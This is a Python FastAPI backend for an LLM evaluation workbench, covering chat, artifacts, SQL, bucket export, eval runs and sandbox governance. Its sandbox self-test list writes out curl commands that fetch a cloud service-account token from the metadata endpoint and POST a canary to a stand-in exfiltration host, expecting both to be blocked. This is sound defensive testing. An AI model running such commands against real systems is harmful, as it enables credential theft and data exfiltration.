import asyncio
import json
import os
import secrets
import subprocess
import time
import uuid
from contextlib import asynccontextmanager
from dataclasses import asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from fastapi import FastAPI, HTTPException, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import PlainTextResponse
from fastapi.staticfiles import StaticFiles

import audit
import context
import ollama_client
import sqlrun
import tools
from agent import EFFORT, NUM_CTX, Turn, think_param
from catalog import Catalog
from eval_harness import EvalHarness
from executors import LocalExecutor
from gpu_detect import check_compatibility, detect_gpu
from mcp_client import MCPTools
from model_manager import ModelManager
from openshell_exec import OpenShellExecutor
from models import (
    Artifact, Base, ChatMessage, ChatSession, ChatSettings, EvalRun, EvalTask, HardwareInfo, ModelCompat,
)
from store import Store

APP_ROOT = Path(os.environ.get("APP_ROOT", Path(__file__).resolve().parent.parent))
MAX_ATTACHMENT_CHARS = 60000

store = Store()
eval_harness = EvalHarness(store)
model_manager = ModelManager()
mcp = MCPTools()
catalog = Catalog()
# run_shell / run_python: executors[governed]
sandbox = OpenShellExecutor()
executors = {False: LocalExecutor(), True: sandbox}
# asyncio only keeps weak references to tasks; hold them until they finish.
background_tasks = set()


def spawn(coro):
    task = asyncio.create_task(coro)
    background_tasks.add(task)
    task.add_done_callback(background_tasks.discard)
    return task


@asynccontextmanager
async def lifespan(app: FastAPI):
    gpu = detect_gpu()
    compat = check_compatibility(gpu)
    app.state.gpu = gpu
    app.state.model_compat = compat

    print(f"GPU: {gpu.name if gpu else 'None'} ({gpu.vram_gb if gpu else 0}GB VRAM)", flush=True)
    for m in compat:
        print(f"  [{'OK' if m.can_run else 'SKIP'}] {m.name}: {m.warning or 'fits'}", flush=True)

    # Downloads can take a while; serve the UI immediately and report progress.
    spawn(model_manager.bootstrap(compat))
    spawn(mcp.refresh(force=True))
    spawn(catalog.refresh_loop(mcp))
    spawn(sandbox.setup())
    spawn(audit.export_loop(os.environ.get("APP_NAME", "nemotron-eval")))
    yield


app = FastAPI(title="Nemotron Eval Terminal", lifespan=lifespan)


@app.middleware("http")
async def frame_policy(request: Request, call_next):
    # A mini-app could navigate its own iframe to another site with data in the
    # URL; the page's frame-src stops that (its own CSP cannot).
    response = await call_next(request)
    response.headers.setdefault("Content-Security-Policy", "frame-src 'self' blob: data:")
    return response


# ---------------------------------------------------------------- helpers

def model_list(app: FastAPI) -> List[ModelCompat]:
    return [
        ModelCompat(**asdict(m), **model_manager.status.get(m.model_id, {}), **model_manager.info.get(m.model_id, {}))
        for m in app.state.model_compat
    ]


def require_ready(model_id: str):
    if not model_manager.is_ready(model_id):
        state = model_manager.status.get(model_id, {})
        raise HTTPException(400, f"Model {model_id or '(none)'} is not ready: {state.get('status', 'unknown')} {state.get('detail', '')}")


def session_summary(s: ChatSession) -> Dict[str, Any]:
    return {
        "id": s.id, "title": s.title, "model_id": s.model_id, "updated_at": s.updated_at,
        "messages": sum(1 for m in s.messages if m.role == "user"),
    }


def gpu_memory() -> Optional[Dict[str, int]]:
    try:
        out = subprocess.run(
            ["nvidia-smi", "--query-gpu=memory.used,memory.total", "--format=csv,noheader,nounits"],
            capture_output=True, text=True, timeout=5, check=True,
        ).stdout.strip().splitlines()[0]
        used, total = (int(x.strip()) for x in out.split(","))
        return {"used_mb": used, "total_mb": total}
    except Exception:
        return None


def parse_bucket(target: str) -> Tuple[str, str]:
    target = target.strip().removeprefix("gs://")
    bucket, _, prefix = target.partition("/")
    return bucket, prefix


def upload_text(target: str, name: str, text: str, content_type: str) -> str:
    from google.cloud import storage

    bucket, prefix = parse_bucket(target)
    if not bucket:
        raise ValueError("Bucket is required")
    path = f"{prefix.rstrip('/')}/{name}" if prefix else f"nemotron-eval/{name}"
    storage.Client().bucket(bucket).blob(path).upload_from_string(text, content_type=content_type)
    return f"gs://{bucket}/{path}"


def session_markdown(s: ChatSession) -> str:
    lines = [f"# {s.title}", "", f"_Model: {s.model_id} · exported {datetime.now():%Y-%m-%d %H:%M}_", ""]
    for m in s.messages:
        if m.role == "user":
            lines += ["## 👤 User", "", m.content, ""]
        elif m.role == "assistant":
            if m.content.strip():
                lines += [f"## 🤖 {m.model_id or 'assistant'}", "", m.content, ""]
            for c in m.tool_calls or []:
                lines += [f"**Tool call:** `{c['name']}`", "", "```json", json.dumps(c["arguments"], indent=2), "```", ""]
        elif m.role == "tool":
            lines += [f"<details><summary>Result of {m.tool_name}</summary>", "", "```", m.content[:5000], "```", "</details>", ""]
    for a in store.list_artifacts(s.id):
        fence = {"markdown": "markdown", "sql": "sql", "html": "html", "chart": "json", "csv": "csv"}.get(a.type, a.language or "")
        lines += [f"## Artifact: {a.title} ({a.type}, v{a.version})", "", f"```{fence}", a.content, "```", ""]
    return "\n".join(lines)


# ---------------------------------------------------------------- models / status

@app.get("/api/hardware", response_model=HardwareInfo)
async def hardware_info(request: Request):
    gpu = request.app.state.gpu
    return HardwareInfo(gpu=asdict(gpu) if gpu else None, models=model_list(request.app))


@app.get("/api/models", response_model=List[ModelCompat])
async def list_models(request: Request):
    return model_list(request.app)


@app.get("/api/health")
async def health():
    return {"ok": True, "ollama": await ollama_client.is_up()}


@app.get("/api/status")
async def status():
    await mcp.refresh()
    try:
        loaded = [{"name": m["name"], "size_vram": m.get("size_vram", 0), "size": m.get("size", 0)} for m in await ollama_client.ps()]
    except Exception:
        loaded = []
    return {
        "loaded": loaded,
        "gpu": gpu_memory(),
        "mcp": {"connected": mcp.connected, "tools": len(mcp.tools), "error": mcp.error},
        "context": context.context_status(),
        "catalog": {"datasets": len(catalog.datasets), "buckets": len(catalog.buckets), "updated_at": catalog.updated_at, "error": catalog.error},
        "num_ctx": NUM_CTX,
        "openshell": sandbox.status,
    }


@app.get("/api/options")
async def options():
    return {
        "presets": [{"id": k, "label": v["label"], "tools": v["tools"]} for k, v in context.PRESETS.items()],
        "efforts": [{"id": k, **v} for k, v in EFFORT.items()],
        "num_ctx": NUM_CTX,
    }


# ---------------------------------------------------------------- chat over WebSocket

def apply_user_input(session: ChatSession, data: Dict[str, Any]):
    kind = data.get("type", "send")
    if kind == "regenerate":
        last_user = max((i for i, m in enumerate(session.messages) if m.role == "user"), default=None)
        if last_user is None:
            raise ValueError("Nothing to regenerate")
        del session.messages[last_user + 1:]
        return
    if kind == "edit":
        index = int(data.get("index", -1))
        if not (0 <= index < len(session.messages)) or session.messages[index].role != "user":
            raise ValueError("Can only edit a user message")
        del session.messages[index:]

    message = str(data.get("message", ""))
    attachments = data.get("attachments") or []
    content = message
    for att in attachments:
        body = tools.truncate(str(att.get("content", "")), MAX_ATTACHMENT_CHARS)
        content += f"\n\n<attachment name=\"{att.get('name', 'file')}\">\n{body}\n</attachment>"
    session.messages.append(ChatMessage(
        role="user", content=content, model_id=session.settings.model_id,
        meta={"display": message, "attachments": [a.get("name", "file") for a in attachments]} if attachments else {},
    ))
    if session.title == "New chat":
        session.title = (message.strip().splitlines() or ["New chat"])[0][:60] or "New chat"


@app.websocket("/ws/chat/{session_id}")
async def ws_chat(websocket: WebSocket, session_id: str):
    await websocket.accept()
    send_lock = asyncio.Lock()
    pending: Dict[str, asyncio.Future] = {}
    current: Dict[str, Optional[asyncio.Task]] = {"task": None}

    async def emit(event: Dict[str, Any]):
        # default=str: events carry datetimes (session summaries, artifacts).
        text = json.dumps(event, default=str)
        try:
            async with send_lock:
                await websocket.send_text(text)
        except Exception as e:
            # The browser went away; the turn keeps running and is saved.
            print(f"[ws] could not send {event.get('type')}: {type(e).__name__}", flush=True)

    async def confirm(call_id: str, name: str, args: Dict[str, Any], reason: str) -> bool:
        future = asyncio.get_running_loop().create_future()
        pending[call_id] = future
        await emit({"type": "confirm_request", "id": call_id, "name": name, "arguments": args, "reason": reason})
        try:
            return await future
        finally:
            pending.pop(call_id, None)

    async def handle(data: Dict[str, Any]):
        try:
            settings = ChatSettings(**(data.get("settings") or {}))
            require_ready(settings.model_id)
            session = store.get_session(session_id) or ChatSession(id=session_id, title="New chat", model_id=settings.model_id)
            session.settings, session.model_id = settings, settings.model_id
            apply_user_input(session, data)
            store.save_session(session)
        except HTTPException as e:
            await emit({"type": "error", "content": e.detail})
            return
        except Exception as e:
            await emit({"type": "error", "content": str(e)})
            return

        await emit({"type": "start", "model_id": settings.model_id, "session": session_summary(session)})
        try:
            if settings.model_id not in await ollama_client.loaded_models():
                await emit({"type": "status", "content": f"Loading {settings.model_id} into GPU memory (can take 1–2 minutes after a restart or model switch)…"})
        except Exception:
            pass
        turn = Turn(session, settings, store, mcp, catalog, model_manager.info.get(settings.model_id, {}), emit, confirm, executors)
        await turn.run()
        await emit({"type": "session", "session": session_summary(session)})

    try:
        while True:
            data = await websocket.receive_json()
            kind = data.get("type", "send")
            if kind == "stop":
                if current["task"] and not current["task"].done():
                    current["task"].cancel()
            elif kind == "confirm":
                future = pending.get(data.get("id", ""))
                if future and not future.done():
                    future.set_result(bool(data.get("approve")))
            elif kind in ("send", "regenerate", "edit"):
                if current["task"] and not current["task"].done():
                    await emit({"type": "error", "content": "Still working on the previous message — stop it first."})
                else:
                    current["task"] = spawn(handle(data))
    except WebSocketDisconnect:
        if current["task"] and not current["task"].done():
            current["task"].cancel()


@app.websocket("/ws/compare")
async def ws_compare(websocket: WebSocket):
    """One prompt, several models, no tools. Models run one after another."""
    await websocket.accept()
    try:
        data = await websocket.receive_json()
        prompt = str(data.get("prompt", ""))
        settings = ChatSettings(**(data.get("settings") or {}))
        system = context.system_prompt(settings.preset or "plain", settings.system_prompt, tools_enabled=False)
        for model_id in data.get("model_ids", []):
            if not model_manager.is_ready(model_id):
                await websocket.send_json({"type": "model_error", "model_id": model_id, "content": "not ready"})
                continue
            loaded = model_id in await ollama_client.loaded_models()
            await websocket.send_json({"type": "model_start", "model_id": model_id, "loading": not loaded})
            think = think_param(settings.reasoning, model_manager.info.get(model_id, {}).get("thinking_values", []))
            started, final = time.time(), {}
            options = {"num_ctx": NUM_CTX, "num_predict": settings.max_tokens or EFFORT.get(settings.effort, EFFORT["balanced"])["num_predict"]}
            if settings.temperature is not None:
                options["temperature"] = settings.temperature
            try:
                async for chunk in ollama_client.chat_stream(
                    model_id, [{"role": "system", "content": system}, {"role": "user", "content": prompt}],
                    think=think, options=options,
                ):
                    msg = chunk.get("message") or {}
                    if msg.get("thinking"):
                        await websocket.send_json({"type": "thinking", "model_id": model_id, "content": msg["thinking"]})
                    if msg.get("content"):
                        await websocket.send_json({"type": "token", "model_id": model_id, "content": msg["content"]})
                    if chunk.get("done"):
                        final = chunk
            except Exception as e:
                await websocket.send_json({"type": "model_error", "model_id": model_id, "content": str(e)})
                continue
            ns = final.get("eval_duration", 0)
            await websocket.send_json({
                "type": "model_done", "model_id": model_id, "tokens": final.get("eval_count", 0),
                "latency_ms": int((time.time() - started) * 1000),
                "tokens_per_s": round(final.get("eval_count", 0) / (ns / 1e9), 1) if ns else None,
            })
        await websocket.send_json({"type": "done"})
    except WebSocketDisconnect:
        pass


# ---------------------------------------------------------------- sessions

class RenameRequest(Base):
    title: str


class SaveRequest(Base):
    bucket: str
    name: Optional[str] = None


@app.get("/api/sessions")
async def list_sessions():
    return [session_summary(s) for s in store.list_sessions()]


@app.get("/api/sessions/{session_id}", response_model=ChatSession)
async def get_session(session_id: str):
    session = store.get_session(session_id)
    if not session:
        raise HTTPException(404, "Session not found")
    return session


@app.patch("/api/sessions/{session_id}")
async def rename_session(session_id: str, body: RenameRequest):
    session = store.get_session(session_id)
    if not session:
        raise HTTPException(404, "Session not found")
    session.title = body.title.strip()[:120] or session.title
    store.save_session(session)
    return session_summary(session)


@app.delete("/api/sessions/{session_id}")
async def delete_session(session_id: str):
    store.delete_session(session_id)
    return {"ok": True}


@app.get("/api/sessions/{session_id}/export.md", response_class=PlainTextResponse)
async def export_session(session_id: str):
    session = store.get_session(session_id)
    if not session:
        raise HTTPException(404, "Session not found")
    return session_markdown(session)


@app.post("/api/sessions/{session_id}/save")
async def save_session_to_bucket(session_id: str, body: SaveRequest):
    session = store.get_session(session_id)
    if not session:
        raise HTTPException(404, "Session not found")
    name = body.name or f"chats/{session_id}.md"
    try:
        uri = await asyncio.to_thread(upload_text, body.bucket, name, session_markdown(session), "text/markdown")
    except Exception as e:
        raise HTTPException(400, f"Upload failed: {e}")
    return {"uri": uri}


# ---------------------------------------------------------------- artifacts

class ArtifactCreate(Base):
    session_id: str
    type: str
    title: str
    content: str
    language: Optional[str] = None


class ArtifactUpdate(Base):
    content: str
    title: Optional[str] = None


@app.get("/api/sessions/{session_id}/artifacts", response_model=List[Artifact])
async def session_artifacts(session_id: str):
    return store.list_artifacts(session_id)


@app.post("/api/artifacts", response_model=Artifact)
async def create_artifact(body: ArtifactCreate):
    if body.type not in tools.ARTIFACT_TYPES:
        raise HTTPException(400, f"type must be one of {tools.ARTIFACT_TYPES}")
    return store.create_artifact(body.session_id, body.type, body.title, body.content, body.language)


@app.get("/api/artifacts/{artifact_id}", response_model=Artifact)
async def get_artifact(artifact_id: str, version: Optional[int] = None):
    art = store.get_artifact(artifact_id, version)
    if not art:
        raise HTTPException(404, "Artifact not found")
    return art


@app.get("/api/artifacts/{artifact_id}/versions", response_model=List[Artifact])
async def artifact_versions(artifact_id: str):
    return store.artifact_versions(artifact_id)


@app.put("/api/artifacts/{artifact_id}", response_model=Artifact)
async def update_artifact(artifact_id: str, body: ArtifactUpdate):
    try:
        return store.update_artifact(artifact_id, body.content, body.title)
    except KeyError:
        raise HTTPException(404, "Artifact not found")


@app.post("/api/artifacts/{artifact_id}/save")
async def save_artifact_to_bucket(artifact_id: str, body: SaveRequest):
    art = store.get_artifact(artifact_id)
    if not art:
        raise HTTPException(404, "Artifact not found")
    ext = {"markdown": "md", "sql": "sql", "html": "html", "chart": "json", "csv": "csv"}.get(art.type, "txt")
    if art.type == "code":
        ext = {"python": "py", "r": "R", "javascript": "js", "bash": "sh", "shell": "sh"}.get((art.language or "").lower(), "txt")
    slug = "".join(ch if ch.isalnum() else "-" for ch in art.title.lower()).strip("-")[:60] or art.id
    name = body.name or f"artifacts/{slug}-v{art.version}.{ext}"
    try:
        uri = await asyncio.to_thread(upload_text, body.bucket, name, art.content, "text/plain")
    except Exception as e:
        raise HTTPException(400, f"Upload failed: {e}")
    return {"uri": uri}


# ---------------------------------------------------------------- SQL

class SQLRequest(Base):
    sql: str
    max_rows: int = 500
    confirmed: bool = False


async def _sql(body: SQLRequest, read_only: bool):
    try:
        return await sqlrun.run(body.sql, body.max_rows, read_only=read_only, confirmed=body.confirmed)
    except PermissionError as e:
        message = str(e)
        if message.startswith("needs_confirmation:"):
            raise HTTPException(409, {"needs_confirmation": True, "statement_type": message.split(":", 1)[1]})
        raise HTTPException(403, message)
    except Exception as e:
        raise HTTPException(400, sqlrun.friendly_error(e))


@app.post("/api/sql/run")
async def sql_run(body: SQLRequest):
    """Canvas Run button. Deleting statements need `confirmed`."""
    return await _sql(body, read_only=False)


@app.post("/api/sql/query")
async def sql_query(body: SQLRequest):
    """For HTML mini-apps: SELECT only."""
    return await _sql(body, read_only=True)


# ---------------------------------------------------------------- governance (OpenShell pilot)

class BrokerRequest(Base):
    sql: str
    max_rows: int = 1000


@app.post("/broker/sql")
async def broker_sql(body: BrokerRequest, request: Request):
    """SQL broker for code running in governed sandboxes. The sandbox only has a
    placeholder for this token; its OpenShell supervisor adds the real one."""
    supplied = request.headers.get("authorization", "").removeprefix("Bearer ").strip()
    # The header is set by the sandbox, so it can be spoofed between chats; it is used for attribution only.
    session_id = sandbox.session_for(request.headers.get("x-workbench-sandbox", "")[:40])
    if not secrets.compare_digest(supplied, sandbox.token):
        audit.record(session_id, "broker", "deny", "broker_sql", "missing or wrong broker token", {"sql": body.sql})
        raise HTTPException(401, "invalid broker token")
    try:
        result = await sqlrun.run_governed(body.sql, body.max_rows)
    except sqlrun.PolicyDenied as e:
        audit.record(session_id, "broker", "deny", "broker_sql", str(e), {"sql": body.sql})
        raise HTTPException(403, f"Blocked by policy: {e}")
    except Exception as e:
        audit.record(session_id, "broker", "fail", "broker_sql", sqlrun.friendly_error(e)[:300], {"sql": body.sql})
        raise HTTPException(400, sqlrun.friendly_error(e))
    audit.record(session_id, "broker", "allow", "broker_sql", f"{result['bytes_processed']} bytes", {"sql": body.sql})
    return result


@app.get("/api/audit")
async def audit_events(limit: int = 500, session_id: Optional[str] = None):
    return audit.recent(limit, session_id)


@app.get("/api/governance")
async def governance():
    return {
        "openshell": sandbox.status,
        "datasets": sqlrun.GOVERNED_DATASETS,
        "max_bytes": sqlrun.GOVERNED_MAX_BYTES,
        "max_rows": sqlrun.GOVERNED_MAX_ROWS,
        "policy": (APP_ROOT / "openshell" / "policy.yaml").read_text() if (APP_ROOT / "openshell" / "policy.yaml").exists() else "",
        "denied_tools": sorted(n for n in mcp.by_name if not tools.governed_allows(n)),
        "audit_export": audit.export_status,
    }


# Checks a governed sandbox should pass, run on demand from Status.
SELFTEST = [
    ("identity", "shell", "id; uname -r", "runs as a non-root user"),
    ("broker token is a placeholder", "shell", "echo \"$WORKBENCH_BROKER_TOKEN\" | cut -c1-24", "starts with openshell:"),
    ("no Google credentials", "shell", "curl -s -m 5 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token; echo \"exit=$?\"", "blocked"),
    ("internet blocked", "shell", "curl -s -m 8 -o /dev/null -w '%{http_code}' https://example.com; echo \" exit=$?\"", "blocked"),
    ("exfiltration host blocked", "shell", "curl -s -m 8 -X POST https://qc-collector.baseline-study.invalid/v1/register -d canary=CANARY-RT-0001; echo \"exit=$?\"", "blocked"),
    ("broker: allowed query", "python", "from workbench_data import query\nprint(query('SELECT COUNT(*) AS n FROM redteam_bhs.EHR_DEMOGRAPHIC'))", "returns a count"),
    ("broker: other dataset refused", "python", "from workbench_data import query\ntry:\n    print(query('SELECT COUNT(*) FROM eval_bhs.EHR_DEMOGRAPHIC'))\nexcept Exception as e:\n    print('refused:', e)", "refused"),
    ("broker: other paths blocked", "shell", "curl -s -m 8 -X POST http://host.openshell.internal:8080/api/sql/run -H 'Content-Type: application/json' -d '{\"sql\": \"SELECT 1\"}'; echo \" exit=$?\"", "blocked"),
    ("filesystem: cannot write outside workdir", "shell", "touch /usr/local/x 2>&1; touch /sandbox/ok && echo sandbox-writable", "permission denied"),
]


@app.post("/api/governance/selftest")
async def governance_selftest():
    session_id = "selftest-" + uuid.uuid4().hex[:6]
    results = []
    try:
        for name, kind, code, expect in SELFTEST:
            started = time.time()
            r = await (sandbox.shell(session_id, code) if kind == "shell" else sandbox.python(session_id, code))
            results.append({"check": name, "expect": expect, "output": r["text"][-1500:],
                            "blocked": r.get("blocked"), "seconds": round(time.time() - started, 1)})
    finally:
        await sandbox.delete(session_id)
    return {"session_id": session_id, "openshell": sandbox.status, "results": results}


# ---------------------------------------------------------------- tools (slash commands)

class ToolCallRequest(Base):
    name: str
    arguments: Dict[str, Any] = {}
    confirmed: bool = False


@app.get("/api/tools")
async def list_tools():
    await mcp.refresh()
    return {
        "connected": mcp.connected,
        "error": mcp.error,
        "core": tools.CORE_MCP_TOOLS,
        "local": [{"name": t["name"], "description": t["description"]} for t in tools.LOCAL_TOOLS],
        "all": [{"name": t["name"], "description": (t.get("description") or "")[:200]} for t in mcp.tools],
    }


@app.post("/api/tools/call")
async def call_tool(body: ToolCallRequest):
    await mcp.refresh()
    if body.name not in mcp.by_name:
        raise HTTPException(404, f"Unknown tool {body.name} ({mcp.error or 'not in catalog'})")
    reason = tools.needs_confirmation(body.name, body.arguments)
    if reason and not body.confirmed:
        raise HTTPException(409, {"needs_confirmation": True, "reason": reason})
    try:
        return await mcp.call(body.name, body.arguments)
    except Exception as e:
        raise HTTPException(502, str(e))


@app.get("/api/buckets")
async def list_buckets():
    """Workspace GCS buckets, for the Save to bucket menus."""
    if not catalog.buckets:
        await catalog.refresh(mcp)
    return catalog.buckets


@app.get("/api/datasets")
async def list_datasets():
    return catalog.datasets


@app.get("/api/catalog/tables")
async def catalog_tables(dataset: str):
    try:
        full, tables = await catalog.list_tables(dataset)
    except Exception as e:
        raise HTTPException(400, str(e))
    return {"dataset": full, "tables": tables}


@app.get("/api/catalog/describe", response_class=PlainTextResponse)
async def catalog_describe(table: str):
    try:
        return await catalog.describe(table)
    except Exception as e:
        raise HTTPException(400, str(e))


class NotesRequest(Base):
    text: str


@app.get("/api/notes")
async def get_notes():
    return {"text": context.read_notes()}


@app.put("/api/notes")
async def put_notes(body: NotesRequest):
    context.write_notes(body.text)
    return {"ok": True, "chars": len(body.text)}


# ---------------------------------------------------------------- prompt library

class PromptCreate(Base):
    title: str
    prompt: str


@app.get("/api/prompts")
async def list_prompts():
    saved = store.list_prompts()
    tasks = [{"id": t.id, "title": t.name, "prompt": t.prompt, "category": t.category, "builtin": True} for t in eval_harness.load_tasks()]
    return {"saved": saved, "builtin": tasks}


@app.post("/api/prompts")
async def save_prompt(body: PromptCreate):
    return store.save_prompt(body.title.strip()[:120] or "Untitled", body.prompt)


@app.delete("/api/prompts/{prompt_id}")
async def delete_prompt(prompt_id: str):
    store.delete_prompt(prompt_id)
    return {"ok": True}


# ---------------------------------------------------------------- evaluation

class EvalRunRequest(Base):
    name: Optional[str] = None
    task_ids: Optional[List[str]] = None
    model_ids: List[str]


@app.post("/api/eval/run")
async def run_eval(body: EvalRunRequest):
    model_ids = [m for m in body.model_ids if model_manager.is_ready(m)]
    if not model_ids:
        raise HTTPException(400, "None of the selected models are ready yet")

    run = EvalRun(
        id=uuid.uuid4().hex[:8],
        name=body.name or f"eval-{datetime.now().strftime('%Y%m%d-%H%M%S')}",
        model_ids=model_ids,
    )
    # Save before returning so the UI can fetch the run straight away.
    store.save_run(run)
    spawn(eval_harness.run_eval(run, body.task_ids or []))
    return {"run_id": run.id, "status": "started", "model_ids": model_ids}


@app.get("/api/eval/runs")
async def list_eval_runs():
    return store.list_runs()


@app.get("/api/eval/runs/{run_id}")
async def get_eval_run(run_id: str):
    run = store.get_run(run_id)
    if not run:
        raise HTTPException(404, "Run not found")
    return run


@app.get("/api/tasks", response_model=List[EvalTask])
async def list_tasks():
    return eval_harness.load_tasks()


# Mounted last so /api and /ws routes take precedence. Serving the frontend at
# the root keeps its relative asset paths working behind the Workbench proxy.
app.mount("/", StaticFiles(directory=APP_ROOT / "frontend", html=True), name="frontend")
